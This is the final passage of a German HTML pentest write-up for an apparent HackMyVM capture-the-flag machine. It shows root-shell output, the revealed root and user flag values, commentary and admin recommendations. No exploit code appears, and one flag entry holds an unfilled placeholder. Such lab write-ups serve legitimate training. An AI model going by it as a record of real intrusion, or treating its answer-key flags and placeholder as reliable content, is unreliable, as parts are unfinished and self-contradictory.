+                     <li><strong>Starke Passwörter und Zugriffsverwaltung:</strong> Erzwingen Sie starke, eindeutige Passwörter für alle Benutzerkonten und überprüfen Sie regelmäßig die Zugriffsrechte.</li>
+                 </ul>
+
+            <div class="code-block">
+                 <div class="terminal">
+                      <pre><span class="password"># ls ~</span>
+<span class="password">flag.sh  root.txt</span>
+<span class="password"># cat ~/root.txt</span>
+<span class="password">HMVhappy2021</span>
+<span class="password"># chmod +x flag.sh</span>
+<span class="password"># ./flag.sh</span>
+<span class="password">                                   .     **</span>
+<span class="password">                                *           *.</span>
+<span class="password">                                              ,*</span>
+<span class="password">                                                 *,</span>
+<span class="password">                         ,                         ,*</span>
+<span class="password">                      .,                              *,</span>
+<span class="password">                    /                                    *</span>
+<span class="password">                 ,*                                        *,</span>
+<span class="password">               /.                                            .*.</span>
+<span class="password">             *                                                  **</span>
+<span class="password">             ,*                                               ,*</span>
+<span class="password">                **                                          *.</span>
+<span class="password">                   **                                    **.</span>
+<span class="password">                     ,*                                **</span>
+<span class="password">                        *,                          ,*</span>
+<span class="password">                           *                      **</span>
+<span class="password">                             *,                .*</span>
+<span class="password">                                *.           **</span>
+<span class="password">                                  **      ,*,</span>
+<span class="password">                                     ** *,</span>
+<span class="password">-------------------------</span>
+<span class="password">PWNED HOST: number</span>
+<span class="password">PWNED DATE: Wed 11 Jun 2025 11:04:15 AM EDT</span>
+
+<span class="password">WHOAMI: uid=0(root) gid=0(root) groups=0(root)</span>
+<span class="password">FLAG: HMVhi2021</span>
+<span class="password">------------------------</span>
+<span class="password">#</span></pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> In der Root-Shell (erkennbar am Prompt <code>#</code>) führe ich Befehle aus, um die Root-Flag und die User-Flag zu finden und auszugeben. Zuerst liste ich den Inhalt des aktuellen Verzeichnisses auf (<code>ls ~</code> oder <code>ls /root/</code>). Die Ausgabe zeigt die Datei <code>root.txt</code>. Ich lese den Inhalt von <code>root.txt</code> mit <code>cat ~/root.txt</code> aus. Der Wert der Root-Flag ist <code>HMVhappy2021</code>. Danach mache ich die Datei <code>flag.sh</code> ausführbar (<code>chmod +x flag.sh</code>, obwohl sie wahrscheinlich im Home-Verzeichnis von melon oder einem anderen Benutzer liegt, da sie zuvor dort gefunden wurde; die Ausführung als Root ermöglicht jedoch den Zugriff unabhängig vom Speicherort, solange der Pfad korrekt ist, oder sie wurde in das Root-Verzeichnis kopiert). Ich führe <code>flag.sh</code> aus (<code>./flag.sh</code>), um die User-Flag zu erhalten (wie der Quellcode von flag.sh implizierte, dass es die Flags ausgibt). Die Ausgabe von <code>flag.sh</code> zeigt ASCII-Art, Systeminformationen (hostname, date, whoami als root) und die Zeile <code>FLAG: HMVhi2021</code>. Für Laien: Jetzt, wo ich der 'Chef' (root) bin, schaue ich in den Ordner des 'Chefs' (<code>/root/</code>) und finde die 'Geheimnummer' (Root-Flag)! Dann mache ich ein anderes Programm (flag.sh) ausführbar und starte es, und es zeigt mir die 'Geheimnummer' des Benutzers (User-Flag)! Fantastisch, beide Nummern gefunden! Für Experten: Das Auffinden und Auslesen von <code>/root/root.txt</code> (<code>HMVhappy2021</code>) ist der Standardweg zur Root-Flag. Die Ausführung von <code>flag.sh</code>, das versucht, die Root- und User-Flags auszulesen, wenn es mit Root-Berechtigungen läuft, ist ebenfalls ein valider Weg, um die User-Flag zu erhalten (<code>HMVhi2021</code>). Die <code>WHOAMI: uid=0(root)</code> Ausgabe von flag.sh bestätigt, dass es mit Root-Rechten ausgeführt wurde.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Beide Flags (Root-Flag: <code>HMVhappy2021</code>, User-Flag: <code>HMVhi2021</code>) wurden erfolgreich gefunden und ausgelesen. Die Ziele des Pentests sind erreicht.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Der Pentest ist abgeschlossen. Dokumentieren Sie die gefundenen Flags.<br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass Flags sicher gespeichert und nur für autorisierte Benutzer zugänglich sind. Platzieren Sie die Root-Flag nur in einem Verzeichnis, das nur für Root zugänglich ist.</p>
+
+        </section>
+
+        <section id="flags">
+            <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+                <!-- Einzelne Flags werden hier im korrigierten Format eingefügt -->
+                <div class="flag-entry">
+                    <div class="flag-command">cat /home/melon/user.txt</div>
+                    <div class="flag-value"><span class="password">[User Flag Wert aus Text extrahieren]</span></div>
+                </div>
+                 <div class="flag-entry">
+                    <div class="flag-command">./flag.sh</div>
+                     <div class="flag-value"><span class="password">HMVhi2021</span></div>
+                 </div>
+                <div class="flag-entry">
+                    <div class="flag-command">cat /root/root.txt</div>
+                    <div class="flag-value"><span class="password">HMVhappy2021</span></div>
+                </div>
+            </div>
+        </section>
+
+
+    </div> <!-- Ende container -->
+
+    <footer class="footer">
+        <p>Ben - Cyber Security Reports</p>
+        <p>Berichtsdatum: 11. Juni 2025</p>
+    </footer>
+
+</body>
+</html>
